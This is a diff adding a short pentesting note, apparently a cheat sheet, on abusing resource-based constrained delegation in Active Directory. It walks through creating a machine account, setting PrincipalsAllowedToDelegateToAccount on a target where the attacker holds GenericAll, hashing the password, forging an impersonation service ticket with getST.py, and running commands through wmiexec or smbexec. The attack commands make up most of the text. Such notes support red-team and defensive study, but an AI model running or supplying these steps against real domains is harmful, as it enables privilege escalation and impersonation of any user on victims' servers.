@@ -1,0 +1,30 @@
+The idea is to set the attribute msds-allowedtoactonbehalfofotheridentity, generate a computer or use a service account and set the attribute with this account. When you generate this you will know the password of the computer account or the service account, with that you can impersonate any user you want on the computer that you have generic-all and where you setted this property
+
+Nowadays the msds-allowedtoactonbehalfofotheridentity is being setted by te attribute PrincipalsAllowedToDelegateToAccount
+
+Create computer account:
+Import-Module .\Powermad.ps1
+New-MachineAccount -MachineAccount {COMPUTER NAME} -Password $(ConvertTo-SecureString '{PASSWORD}' -AsPlainText -Force) -Verbose
+
+Set attribute on the computer where you have generic-all:
+
+Set-ADComputer -Server {DC-SERVER} -Identity {SERVER/COMPUTER TO ATTACK} -PrincipalsAllowedToDelegateToAccount {COMPUTER OR SERVICE ACCOUNT}
+
+Check if you setted this correctly:
+Get-ADComputer -Server {DC-SERVER} {SERVER/COMPUTER TO ATTACK} -Properties PrincipalsAllowedToDelegateToAccount
+
+With that you just need to ask to the dc to perform a service ticket from the account of the service or comptuer account to act on behalf of another account. (normaly computer checks a attribute of the ticket but we have setted the PrincipalsAllowedToDelegateToAccount so the computer/server won't check it and will trust on us).
+
+Convert the password we setted on the computer account or the service account to NThash:
+
+Install-Module DSInternals -Force
+$password = ConvertTo-SecureString '{PASSWORD}' -AsPlainText -Force
+ConvertTo-NTHash $password
+
+Generate the TGS (IN LINUX):
+getST.py -spn {SERVICE YOU WANT (cifs,host,etc)}/{SERVER TO ATTACK} -impersonate {USER-TO-IMPERSONATE} {DOMAIN}/{COMPUTER OR SERVICE ACCOUNT (remember to \$ if it is a computer)}:{PASSWORD}
+
+After all of that we can export the variable and use wmiexec, smbexec, or wherever you want with a ticket.
+export KRB5CCNAME={TICKET GENERATED}
+
+{COMMAND YOU WANT}
